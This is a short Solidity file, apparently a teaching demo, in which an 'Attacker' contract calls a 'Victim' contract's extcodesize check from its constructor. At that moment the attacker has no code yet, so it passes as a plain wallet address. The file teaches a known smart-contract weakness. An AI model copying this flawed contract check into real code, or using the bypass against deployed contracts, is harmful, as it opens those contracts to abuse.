// SPDX-License-Identifier: GPL-3.0
pragma solidity >= 0.7.0 < 0.9.0;

contract Victim {

    // Checks if the address inputted is a contract or simply a wallet address.
    // Copy/paste wallet addresses and contract addresses to see the difference.
    function IsItAContract(address _a) public view returns(bool) {

        uint size;  address a = _a;

        // Inline assembly accesses EVM at a low level (machine level)
        assembly {
            size := extcodesize(a)  // extcodesize retrieves the size of the code.
            //  Correct way to assign when using 'assembly'.
        }
        // If there are bytes of code greater than zero in the address, then it's a contract. Returns 'true'.
        return size > 0;    
    }

    // Checks if the address calling the contract (msg.sender) is a contract or simply an address.
    function IsItAContract() public view returns(bool) {  

        uint size;  address a = msg.sender;

        // Inline assembly accesses EVM at a low level (machine level)
        assembly {
            size := extcodesize(a)  // extcodesize retrieves the size of the code (in bytes).
            //  Correct way to assign when using 'assembly' is := and not = .
        }
        // If there are bytes of code greater than zero in the address, then it's a contract.
        return size > 0;
    }
}

// This contract should return false when a contract address is inputed during deployment.
// By making the 'Victim' contract misbehave (it'supposed to return true), it has been hacked.
contract Attacker {

    bool public TrickedYou;
    Victim _victim;           // Bringing in the contract above as a datatype via a variable.

    // When the 'Victim'contract is called from the constructor of this contract (ie. the call is made during
    // deployment) there are no byte codes in the address! The byte codes of a contract become present after 
    // deployment. So the function ('IsItAContract') being called in the 'Victim' contract checks the address 
    // of the caller (msg.sender) which in this case is the address of the contract 'Attacker'. The function sees 
    // no byte codes, therefore it returns false, saying it's not a contract.
    constructor(address _v) {
         
        _victim = Victim(_v);
        TrickedYou = _victim.IsItAContract();
    }

    // When the 'Victim'contract is called from this function below, apparently after deployment, it returns 
    // true, saying it's a contract, because the bytecodes are now present.
    function AmIAContract() public view returns(bool) {
        return _victim.IsItAContract();
    }
}
